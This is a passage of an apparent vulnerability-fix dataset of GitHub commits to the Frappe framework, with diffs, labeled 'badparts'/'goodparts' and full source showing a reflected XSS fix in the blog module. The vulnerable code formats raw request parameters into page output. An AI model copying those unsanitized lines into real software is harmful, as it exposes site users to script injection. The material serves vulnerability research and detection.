(\"Attach\", \"Attach Image\")\n\n\t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n\t\t\t\t\t\tor self.docstatus==2\n\t\t\t\t\t\tor (self.docstatus==1 and not df.get(\"allow_on_submit\"))):\n\t\t\t\tcontinue\n\n\t\t\telse:\n\t\t\t\tsanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')\n\n\t\t\tself.set(fieldname, sanitized_value)\n\n\tdef _save_passwords(self):\n\t\t'''Save password field values in __Auth table'''\n\t\tif self.flags.ignore_save_passwords is True:\n\t\t\treturn\n\n\t\tfor df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):\n\t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue\n\t\t\tnew_password = self.get(df.fieldname)\n\t\t\tif new_password and not self.is_dummy_password(new_password):\n\t\t\t\t# is not a dummy password like '*****'\n\t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname)\n\n\t\t\t\t# set dummy password like '*****'\n\t\t\t\tself.set(df.fieldname, '*'*len(new_password))\n\n\tdef get_password(self, fieldname='password', raise_exception=True):\n\t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):\n\t\t\treturn self.get(fieldname)\n\n\t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)\n\n\tdef is_dummy_password(self, pwd):\n\t\treturn ''.join(set(pwd))=='*'\n\n\tdef precision(self, fieldname, parentfield=None):\n\t\t\"\"\"Returns float precision for a particular field (or get global default).\n\n\t\t:param fieldname: Fieldname for which precision is required.\n\t\t:param parentfield: If fieldname is in child table.\"\"\"\n\t\tfrom frappe.model.meta import get_field_precision\n\n\t\tif parentfield and not isinstance(parentfield, string_types):\n\t\t\tparentfield = parentfield.parentfield\n\n\t\tcache_key = parentfield or \"main\"\n\n\t\tif not hasattr(self, \"_precision\"):\n\t\t\tself._precision = frappe._dict()\n\n\t\tif cache_key not in self._precision:\n\t\t\tself._precision[cache_key] = frappe._dict()\n\n\t\tif fieldname not in self._precision[cache_key]:\n\t\t\tself._precision[cache_key][fieldname] = None\n\n\t\t\tdoctype = self.meta.get_field(parentfield).options if parentfield else self.doctype\n\t\t\tdf = frappe.get_meta(doctype).get_field(fieldname)\n\n\t\t\tif df.fieldtype in (\"Currency\", \"Float\", \"Percent\"):\n\t\t\t\tself._precision[cache_key][fieldname] = get_field_precision(df, self)\n\n\t\treturn self._precision[cache_key][fieldname]\n\n\n\tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):\n\t\tfrom frappe.utils.formatters import format_value\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif not df and fieldname in default_fields:\n\t\t\tfrom frappe.model.meta import get_default_df\n\t\t\tdf = get_default_df(fieldname)\n\n\t\tval = self.get(fieldname)\n\n\t\tif translated:\n\t\t\tval = _(val)\n\n\t\tif absolute_value and isinstance(val, (int, float)):\n\t\t\tval = abs(self.get(fieldname))\n\n\t\tif not doc:\n\t\t\tdoc = getattr(self, \"parent_doc\", None) or self\n\n\t\treturn format_value(val, df=df, doc=doc, currency=currency)\n\n\tdef is_print_hide(self, fieldname, df=None, for_print=True):\n\t\t\"\"\"Returns true if fieldname is to be hidden for print.\n\n\t\tPrint Hide can be set via the Print Format Builder or in the controller as a list\n\t\tof hidden fields. Example\n\n\t\t\tclass MyDoc(Document):\n\t\t\t\tdef __setup__(self):\n\t\t\t\t\tself.print_hide = [\"field1\", \"field2\"]\n\n\t\t:param fieldname: Fieldname to be checked if hidden.\n\t\t\"\"\"\n\t\tmeta_df = self.meta.get_field(fieldname)\n\t\tif meta_df and meta_df.get(\"__print_hide\"):\n\t\t\treturn True\n\n\t\tprint_hide = 0\n\n\t\tif self.get(fieldname)==0 and not self.meta.istable:\n\t\t\tprint_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )\n\n\t\tif not print_hide:\n\t\t\tif df and df.print_hide is not None:\n\t\t\t\tprint_hide = df.print_hide\n\t\t\telif meta_df:\n\t\t\t\tprint_hide = meta_df.print_hide\n\n\t\treturn print_hide\n\n\tdef in_format_data(self, fieldname):\n\t\t\"\"\"Returns True if shown via Print Format::`format_data` property.\n\t\t\tCalled from within standard print format.\"\"\"\n\t\tdoc = getattr(self, \"parent_doc\", self)\n\n\t\tif hasattr(doc, \"format_data_map\"):\n\t\t\treturn fieldname in doc.format_data_map\n\t\telse:\n\t\t\treturn True\n\n\tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):\n\t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\"\n\t\tto_reset = []\n\n\t\tfor df in high_permlevel_fields:\n\t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:\n\t\t\t\tto_reset.append(df)\n\n\t\tif to_reset:\n\t\t\tif self.is_new():\n\t\t\t\t# if new, set default value\n\t\t\t\tref_doc = frappe.new_doc(self.doctype)\n\t\t\telse:\n\t\t\t\t# get values from old doc\n\t\t\t\tif self.get('parent_doc'):\n\t\t\t\t\tself.parent_doc.get_latest()\n\t\t\t\t\tref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]\n\t\t\t\telse:\n\t\t\t\t\tref_doc = self.get_latest()\n\n\t\t\tfor df in to_reset:\n\t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname))\n\n\tdef get_value(self, fieldname):\n\t\tdf = self.meta.get_field(fieldname)\n\t\tval = self.get(fieldname)\n\n\t\treturn self.cast(val, df)\n\n\tdef cast(self, value, df):\n\t\treturn cast_fieldtype(df.fieldtype, value)\n\n\tdef _extract_images_from_text_editor(self):\n\t\tfrom frappe.utils.file_manager import extract_images_from_doc\n\t\tif self.doctype != \"DocType\":\n\t\t\tfor df in self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Text Editor\")}):\n\t\t\t\textract_images_from_doc(self, df.fieldname)\n\ndef _filter(data, filters, limit=None):\n\t\"\"\"pass filters as:\n\t\t{\"key\": \"val\", \"key\": [\"!=\", \"val\"],\n\t\t\"key\": [\"in\", \"val\"], \"key\": [\"not in\", \"val\"], \"key\": \"^val\",\n\t\t\"key\" : True (exists), \"key\": False (does not exist) }\"\"\"\n\n\tout, _filters = [], {}\n\n\tif not data:\n\t\treturn out\n\n\t# setup filters as tuples\n\tif filters:\n\t\tfor f in filters:\n\t\t\tfval = filters[f]\n\n\t\t\tif not isinstance(fval, (tuple, list)):\n\t\t\t\tif fval is True:\n\t\t\t\t\tfval = (\"not None\", fval)\n\t\t\t\telif fval is False:\n\t\t\t\t\tfval = (\"None\", fval)\n\t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"):\n\t\t\t\t\tfval = (\"^\", fval[1:])\n\t\t\t\telse:\n\t\t\t\t\tfval = (\"=\", fval)\n\n\t\t\t_filters[f] = fval\n\n\tfor d in data:\n\t\tadd = True\n\t\tfor f, fval in iteritems(_filters):\n\t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]):\n\t\t\t\tadd = False\n\t\t\t\tbreak\n\n\t\tif add:\n\t\t\tout.append(d)\n\t\t\tif limit and (len(out)-1)==limit:\n\t\t\t\tbreak\n\n\treturn out\n"}}, "msg": "fix(Barcode): excluding Barcode feild from XSS FIlter (#7605)\n\n(cherry picked from commit e579b8960e1c34e7ad0bf794a10596b40530bc09)"}}, "https://github.com/pardeep11/frappe": {"2fa19c25066ed17478d683666895e3266936aee6": {"url": "https://api.github.com/repos/pardeep11/frappe/commits/2fa19c25066ed17478d683666895e3266936aee6", "html_url": "https://github.com/pardeep11/frappe/commit/2fa19c25066ed17478d683666895e3266936aee6", "sha": "2fa19c25066ed17478d683666895e3266936aee6", "keyword": "XSS fix", "diff": "diff --git a/frappe/website/doctype/blog_post/blog_post.py b/frappe/website/doctype/blog_post/blog_post.py\nindex a20e9fa12..e4c757e64 100644\n--- a/frappe/website/doctype/blog_post/blog_post.py\n+++ b/frappe/website/doctype/blog_post/blog_post.py\n@@ -7,7 +7,7 @@\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n@@ -95,7 +95,7 @@ def get_list_context(context=None):\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n@@ -107,7 +107,7 @@ def get_list_context(context=None):\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n", "message": "", "files": {"/frappe/website/doctype/blog_post/blog_post.py": {"changes": [{"diff": "\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n", "add": 1, "remove": 1, "filename": "/frappe/website/doctype/blog_post/blog_post.py", "badparts": ["from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown"], "goodparts": ["from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html"]}, {"diff": "\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n", "add": 1, "remove": 1, "filename": "/frappe/website/doctype/blog_post/blog_post.py", "badparts": ["\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category"], "goodparts": ["\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)"]}, {"diff": "\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n", "add": 1, "remove": 1, "filename": "/frappe/website/doctype/blog_post/blog_post.py", "badparts": ["\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)"], "goodparts": ["\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))"]}], "source": "\n from __future__ import unicode_literals import frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar=\"/\" +post.avatar \treturn posts ", "sourceWithComments": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe\nfrom frappe import _\nfrom frappe.website.website_generator import WebsiteGenerator\nfrom frappe.website.render import clear_cache\nfrom frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\nfrom frappe.website.utils import find_first_image, get_comment_list\n\nclass BlogPost(WebsiteGenerator):\n\twebsite = frappe._dict(\n\t\torder_by = \"published_on desc\"\n\t)\n\n\tdef make_route(self):\n\t\tif not self.route:\n\t\t\treturn frappe.db.get_value('Blog Category', self.blog_category,\n\t\t\t\t'route') + '/' + self.scrub(self.title)\n\n\tdef get_feed(self):\n\t\treturn self.title\n\n\tdef validate(self):\n\t\tsuper(BlogPost, self).validate()\n\n\t\tif not self.blog_intro:\n\t\t\tself.blog_intro = self.content[:140]\n\t\t\tself.blog_intro = strip_html_tags(self.blog_intro)\n\n\t\tif self.blog_intro:\n\t\t\tself.blog_intro = self.blog_intro[:140]\n\n\t\tif self.published and not self.published_on:\n\t\t\tself.published_on = today()\n\n\t\t# update posts\n\t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post`\n\t\t\twhere ifnull(blogger,'')=tabBlogger.name)\n\t\t\twhere name=%s\"\"\", (self.blogger,))\n\n\tdef on_update(self):\n\t\tclear_cache(\"writers\")\n\n\tdef get_context(self, context):\n\t\t# this is for double precaution. usually it wont reach this code if not published\n\t\tif not cint(self.published):\n\t\t\traise Exception(\"This blog has not been published yet!\")\n\n\t\t# temp fields\n\t\tcontext.full_name = get_fullname(self.owner)\n\t\tcontext.updated = global_date_format(self.published_on)\n\n\t\tif self.blogger:\n\t\t\tcontext.blogger_info = frappe.get_doc(\"Blogger\", self.blogger).as_dict()\n\n\t\tcontext.description = self.blog_intro or self.content[:140]\n\n\t\tcontext.metatags = {\n\t\t\t\"name\": self.title,\n\t\t\t\"description\": context.description,\n\t\t}\n\n\t\tif \"<!-- markdown -->\" in context.content:\n\t\t\tcontext.content = markdown(context.content)\n\n\t\timage = find_first_image(self.content)\n\t\tif image:\n\t\t\tcontext.metatags[\"image\"] = image\n\n\t\tcontext.comment_list = get_comment_list(self.doctype, self.name)\n\t\tif not context.comment_list:\n\t\t\tcontext.comment_text = _('No comments yet')\n\t\telse:\n\t\t\tif(len(context.comment_list)) == 1:\n\t\t\t\tcontext.comment_text = _('1 comment')\n\t\t\telse:\n\t\t\t\tcontext.comment_text = _('{0} comments').format(len(context.comment_list))\n\n\t\tcontext.category = frappe.db.get_value(\"Blog Category\",\n\t\t\tcontext.doc.blog_category, [\"title\", \"route\"], as_dict=1)\n\t\tcontext.parents = [{\"name\": _(\"Home\"), \"route\":\"/\"},\n\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"},\n\t\t\t{\"label\": context.category.title, \"route\":context.category.route}]\n\ndef get_list_context(context=None):\n\tlist_context = frappe._dict(\n\t\ttemplate = \"templates/includes/blog/blog.html\",\n\t\tget_list = get_blog_list,\n\t\thide_filters = True,\n\t\tchildren = get_children(),\n\t\t# show_search = True,\n\t\ttitle = _('Blog')\n\t)\n\n\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n\tif category:\n\t\tcategory_title = get_blog_category(category)\n\t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n\t\tlist_context.title = category_title\n\n\telif frappe.local.form_dict.blogger:\n\t\tblogger = frappe.db.get_value(\"Blogger\", {\"name\": frappe.local.form_dict.blogger}, \"full_name\")\n\t\tlist_context.sub_title = _(\"Posts by {0}\").format(blogger)\n\t\tlist_context.title = blogger\n\n\telif frappe.local.form_dict.txt:\n\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n\n\tif list_context.sub_title:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n\t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}]\n\telse:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"}]\n\n\tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True))\n\treturn list_context\n\ndef get_children():\n\treturn frappe.db.sql(\"\"\"select route as name,\n\t\ttitle from `tabBlog Category`\n\t\twhere published = 1\n\t\tand exists (select name from `tabBlog Post`\n\t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)\n\t\torder by title asc\"\"\", as_dict=1)\n\ndef clear_blog_cache():\n\tfor blog in frappe.db.sql_list(\"\"\"select route from\n\t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"):\n\t\tclear_cache(blog)\n\n\tclear_cache(\"writers\")\n\ndef get_blog_category(route):\n\treturn frappe.db.get_value(\"Blog Category\", {\"name\": route}, \"title\") or route\n\ndef get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):\n\tconditions = []\n\tif filters:\n\t\tif filters.blogger:\n\t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger))\n\t\tif filters.blog_category:\n\t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category))\n\n\tif txt:\n\t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt)))\n\n\tif conditions:\n\t\tfrappe.local.no_cache = 1\n\n\tquery = \"\"\"\\\n\t\tselect\n\t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on,\n\t\t\t\tt1.published_on as creation,\n\t\t\t\tt1.content as content,\n\t\t\t\tifnull(t1.blog_intro, t1.content) as intro,\n\t\t\t\tt2.full_name, t2.avatar, t1.blogger,\n\t\t\t\t(select count(name) from `tabCommunication`\n\t\t\t\t\twhere\n\t\t\t\t\t\tcommunication_type='Comment'\n\t\t\t\t\t\tand comment_type='Comment'\n\t\t\t\t\t\tand reference_doctype='Blog Post'\n\t\t\t\t\t\tand reference_name=t1.name) as comments\n\t\tfrom `tabBlog Post` t1, `tabBlogger` t2\n\t\twhere ifnull(t1.published,0)=1\n\t\tand t1.blogger = t2.name\n\t\t%(condition)s\n\t\torder by published_on desc, name asc\n\t\tlimit %(start)s, %(page_len)s\"\"\" % {\n\t\t\t\"start\": limit_start, \"page_len\": limit_page_length,\n\t\t\t\t\"condition\": (\" and \" + \" and \".join(conditions)) if conditions else \"\"\n\t\t}\n\n\tposts = frappe.db.sql(query, as_dict=1)\n\n\tfor post in posts:\n\t\tpost.cover_image = find_first_image(post.content)\n\t\tpost.published = global_date_format(post.creation)\n\t\tpost.content = strip_html_tags(post.content[:340])\n\t\tif not post.comments:\n\t\t\tpost.comment_text = _('No comments yet')\n\t\telif post.comments==1:\n\t\t\tpost.comment_text = _('1 comment')\n\t\telse:\n\t\t\tpost.comment_text = _('{0} comments').format(str(post.comments))\n\n\t\tpost.avatar = post.avatar or \"\"\n\t\tpost.category = frappe.db.get_value('Blog Category', post.blog_category,\n\t\t\t['route', 'title'], as_dict=True)\n\n\t\tif post.avatar and (not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"):\n\t\t\tpost.avatar = \"/\" + post.avatar\n\n\treturn posts\n"}}, "msg": "fix(blog): Fix possible reflected XSS attack vector"}}, "https://github.com/indictranstech/indictrans_frappe": {"2fa19c25066ed17478d683666895e3266936aee6": {"url": "https://api.github.com/repos/indictranstech/indictrans_frappe/commits/2fa19c25066ed17478d683666895e3266936aee6", "html_url": "https://github.com/indictranstech/indictrans_frappe/commit/2fa19c25066ed17478d683666895e3266936aee6", "sha": "2fa19c25066ed17478d683666895e3266936aee6", "keyword": "XSS fix", "diff": "diff --git a/frappe/website/doctype/blog_post/blog_post.py b/frappe/website/doctype/blog_post/blog_post.py\nindex a20e9fa12..e4c757e64 100644\n--- a/frappe/website/doctype/blog_post/blog_post.py\n+++ b/frappe/website/doctype/blog_post/blog_post.py\n@@ -7,7 +7,7 @@\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n@@ -95,7 +95,7 @@ def get_list_context(context=None):\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n@@ -107,7 +107,7 @@ def get_list_context(context=None):\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n", "message": "", "files": {"/frappe/website/doctype/blog_post/blog_post.py": {"changes": [{"diff": "\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n", "add": 1, "remove": 1, "filename": "/frappe/website/doctype/blog_post/blog_post.py", "badparts": ["from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown"], "goodparts": ["from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html"]}, {"diff": "\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n", "add": 1, "remove": 1, "filename": "/frappe/website/doctype/blog_post/blog_post.py", "badparts": ["\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category"], "goodparts": ["\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)"]}, {"diff": "\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n", "add": 1, "remove": 1, "filename": "/frappe/website/doctype/blog_post/blog_post.py", "badparts": ["\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)"], "goodparts": ["\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))"]}], "source": "\n from __future__ import unicode_literals import frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] 